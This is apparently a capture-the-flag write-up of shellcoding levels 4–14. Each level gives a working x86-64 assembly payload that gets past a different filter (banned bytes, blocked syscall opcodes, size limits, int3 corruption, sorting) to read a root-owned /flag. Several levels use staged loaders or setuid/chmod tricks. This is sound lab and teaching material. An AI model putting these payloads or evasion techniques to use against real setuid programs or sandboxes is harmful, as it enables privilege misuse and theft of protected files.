# level 4
- in this challenge, the shellcode should not contain "H". we can avoid "H" by xoring out the register and using mov with shorter registers.
```nasm
.intel_syntax noprefix

.global _start

_start:
    call pwn
    .string "/flag"
    .byte 0x00
pwn:
    ; open(flag, 0)
    xor eax, eax
    xor esi, esi
    xor edx, edx
    xor r10d, r10d
    push [rsp]
    pop rdi
    mov sil, 0
    mov al, 2
    syscall
    ; sendfile(1, rax, 0, 0x100)
    xor edi, edi
    mov dil, 1
    mov sil, al
    mov dl, 0
    mov r10, 0x100
    mov al, 40
    syscall
```
# level 5
- we cannot use syscall in this challenge. opcode for syscall is `0f 05` in hex. so, we can hardcode `0e 05` bytes in shellcode and increment this byte during runtime. 
```nasm
.intel_syntax noprefix

.global _start

_start:
    call pwn
    .string "/flag"
    .byte 0x00
pwn:
    ; open(flag, 0)
    mov rdi, [rsp]
    mov rsi, 0
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05
    ; sendfile(1, rax, 0, 0x100)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40
    inc byte ptr [rip]
    .byte 0x0e, 0x05
```
# level 6
- similar to the last challenge, syscalls are not allowed, and the first 4095 bytes of the shellcode region is write protected, we can slide down this region using `nop` and then modify/write syscall opcode during runtime.
```nasm
.intel_syntax noprefix

.global _start

_start:
    .rept 5000
    nop
    .endr
    call pwn
    .string "/flag"
    .byte 0x00
pwn:
    ; open(flag, 0)
    mov rdi, [rsp]
    mov rsi, 0
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    ; sendfile(1, rax, 0, 0x1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x1000
    mov rax, 40
    inc byte ptr [rip]
    .byte 0x0e, 0x05
```
# level 7
- all fds (stdin, stdout, stderr) are closed before executing shellcode. so we can open another file for writing the flag.
```nasm
.intel_syntax noprefix
.global _start

_start:
    call openflag
    .string "/flag"
    .byte 0x00

openflag:
    ; open(flag, 0(readonly))
    mov rdi, [rsp]
    mov rsi, 0
    mov rax, 2
    syscall
    mov r14, rax
    call openoutflag
    .string "outflag"
    .byte 0x00
openoutflag:
    ; open(flag, 1(writeonly))
    mov rdi, [rsp]
    mov rsi, 1
    mov rax, 2
    syscall
    mov r15, rax
    
    ; sendfile(r15, r14, 0, 0x1000)
    mov rdi, r15
    mov rsi, r14
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40
    syscall

```
flag will be stored in `outflag` in the current directory
# level 8
- have to write shellcode in just 18 bytes. cannot be multi staged because the memory region as write permission is removed after 18 bytes are read.
- we can set real uid to 0 and then execute the shell script in current directly which is named "i" to save space. the reason we need setuid(0) is because execve will the run bash scripts with ruid, and ruid is 1000, unless we explicitly set it with setuid()
```nasm
.intel_syntax noprefix

.global _start

.start:
	; setuid(0)
    xor edi, edi
    mov al, 105
    syscall

    ; execve("i", null, null)
    push 0x69
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    mov al, 59
    syscall
```
file i can have
```bash
#!/bin/bash
cat /flag
```
other solutions that uses chmod are much better and elegant, but i did not know that chmod was a syscall when i wrote my shellcode.
# level 9
- every other 10 bytes in shellcode is modified with `int3` instruction. strategy for this challenge is:
```nasm
instructions + jump + nop_padding = 10 bytes
10 * nops
instructions + jump + nop_padding = 10 bytes
10 * nops
instructions + jump + nop_padding = 10 bytes
10 * nops
...
```
- we are opening file `f` in the current. directory which is a symlink to `/flag`
```nasm
.intel_syntax noprefix

.global _start

_start:
    call pwn
    .string "f"
    .byte 0
    nop
    nop
    .rept 10
    nop
    .endr
pwn:
    ; open(flag, 0)
    mov rdi, [rsp]
    xor rsi, rsi
    jmp one
    nop
    .rept 10
    nop
    .endr
one:
    xor eax, eax
    mov al, 2
    syscall
    jmp two
    nop
    nop
    .rept 10
    nop
    .endr

two:
    ; sendfile(1, rax, 0, 0x100)
    xor edi, edi
    inc edi
    mov rsi, rax
    jmp three
    nop
    .rept 10
    nop
    .endr
three:
    xor edx, edx
    mov r10w, 0x100
    jmp four
    nop
    .rept 10
    nop
    .endr
four:
    xor eax, eax
    mov al, 40
    syscall
```
# level 10
- shellcode will be treated as an array of 8 byte integer and sorted. this can be solved with either a very small shellcode (18 byte shellcode from challenge 8 works here). but we can also implement a very general strategy similar to level9:
```nasm
instructions + jump + nop_padding + byte01 = 8 bytes
                 |
 -----------------
 | 
 v
instructions + jump + nop_padding + byte02 = 8 bytes
                 |
 -----------------
 |
 v
instructions + jump + nop_padding + byte03 = 8 bytes
                 |
 -----------------
 |
 v
instructions + jump + nop_padding + byte04 = 8 bytes
                 |
 -----------------
 |
 v
instructions + jump + nop_padding + byte05 = 8 bytes
```
last byte will be the msb hence, the array is already sorted.
```nasm
.intel_syntax noprefix

.global _start

.start:
    ; open(flag, 0)
    push 0x66
    mov rdi, rsp
    jmp pwn
    .byte 1
pwn:
    xor esi, esi
    xor eax, eax
    jmp one
    nop
    .byte 2
one:
    mov al, 2
    syscall
    jmp two
    nop
    .byte 3
two:
    ; openfile(1, rax, 0, 0x100)
    xor edi, edi
    inc edi
    jmp three
    nop
    .byte 4
three:
    mov rsi, rax
    xor edx, edx
    jmp four
    .byte 5
four:
    mov r10w, 0x100
    jmp five
    .byte 6
five:
    xor eax, eax
    mov al, 40
    syscall
    nop
    .byte 7
```
# level 11 
this challenge is challenge 10 + close(stdin). our shellcode for last challenge doesn't involve a second stage. so shellcode from level 8 and level 10 works for this challenge as well.
# level 12
- every byte in this shellcode should be unique. we can use multi stage shellcode so that the first stage is very small and can made to be unique.
- stage 2 is a generic shellcode.
stage1:
```nasm
.intel_syntax noprefix
.global _start

_start:
    ; read(0, addr, 100)
    push 0x233a6010
    pop rsi

    and rdi, rax
    add dl, 0x78
    
    xor eax, eax
    syscall

```
stage2:
```nasm
.intel_syntax noprefix

.global _start

_start:
    call pwn
    .string "/flag"
    .byte 0x00
pwn:
    ; open(flag, 0)
    mov rdi, [rsp]
    mov rsi, 0
    mov rax, 2
    syscall

    ; sendfile(1, rax, 0, 0x100)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40
    syscall
```
```bash
(cat stage.1.shellcode; sleep 1; cat stage2.shellcode) | /challange/program
```
# level 13
-  only 12 bytes :(
- we can do this using chmod syscall:
```nasm
.intel_syntax noprefix
.global _start

_start:
	; chmod(flag_symlink, garbage_that_ends_in_0100)
    push 0x66
    push rsp
    pop rdi
    mov sil, 4

    mov al, 90
    syscall
```
# level14
- only 6 bytes?
- not possible to craft independent shellcode in 6 bytes. we need to salvage what we have when we call the shellcode. also, the program does not strip write permission from the memory map, which means possibility for staged shellcode
- this is the state of registers and memory when we call the shellcode.
```nasm
0x00000000251c8000 in ?? ()
1: /x $rdi = 0x7c242f1a37e0
2: /x $rsi = 0x7c242f1a2723
3: /x $rdx = 0x251c8000
4: /x $r10 = 0x6501eb76f105
5: /x $rax = 0x0
7: x/10xg $rsp
0x7ffd343e28c8: 0x00006501eb76e7c3      0x00007ffd343e28f6
0x7ffd343e28d8: 0x00007ffd343e2a18      0x00007ffd343e2a08
0x7ffd343e28e8: 0x00000001eb76e7e0      0x0000000000000000
0x7ffd343e28f8: 0x00002710eb76e200      0x00007ffd343e2a10
0x7ffd343e2908: 0x00007ffd343e2ab0      0x0000000000000000
```
- rax is already zero, so we can call read.
- memory region is in rdx, we can exchange rdx and rsi with xchg, so that rsi can point to shellcode mem region.
- we can null rdi with xor. now we can `read(0, mem_addr, some_large_value)`
- for stage2, we can use a generic shellcode with atleast 6 nops at the beginnning.
stage1:
```nasm
.intel_syntax noprefix
.global _start

_start:
    xor edi, edi ; 2 bytes
    xchg edx, esi ; 2 bytes
    syscall ; 2 bytes
```
stage2:
```nasm
.intel_syntax noprefix

.global _start

_start:
    .rept 50
    nop
    .endr
    call pwn
    .string "/flag"
    .byte 0x00
pwn:
    ; open(flag, 0)
    mov rdi, [rsp]
    mov rsi, 0
    mov rax, 2
    syscall

    ; sendfile(1, rax, 0, 0x100)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40
    syscall
```
```bash
$ (cat stage1.shellcode; sleep 1; cat stage2.shellcode) | /challenge/program
```